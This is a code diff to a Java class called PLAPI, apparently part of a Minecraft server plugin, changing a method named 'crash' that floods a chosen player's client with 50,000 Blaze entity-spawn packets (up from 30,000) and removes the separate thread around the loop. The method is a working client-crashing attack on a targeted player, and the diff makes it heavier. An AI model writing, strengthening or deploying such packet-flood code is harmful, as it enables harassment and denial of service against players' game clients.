@@ -64,19 +64,17 @@ public class PLAPI {
     }
 
     public static void crash(Player player) {
-        new Thread(() -> {
-            Location loc = player.getLocation();
-            WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();
+        Location loc = player.getLocation();
+        WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();
 
-            packet.setType(EntityType.BLAZE);
-            packet.setX(loc.getX());
-            packet.setY(loc.getY());
-            packet.setZ(loc.getZ());
+        packet.setType(EntityType.BLAZE);
+        packet.setX(loc.getX());
+        packet.setY(loc.getY());
+        packet.setZ(loc.getZ());
 
-            for (int i = 0; i < 30000; i++) {
-                packet.setEntityID(i);
-                packet.sendPacket(player);
-            }
-        }).start();
+        for (int i = 0; i < 50000; i++) {
+            packet.setEntityID(i);
+            packet.sendPacket(player);
+        }
     }
 }
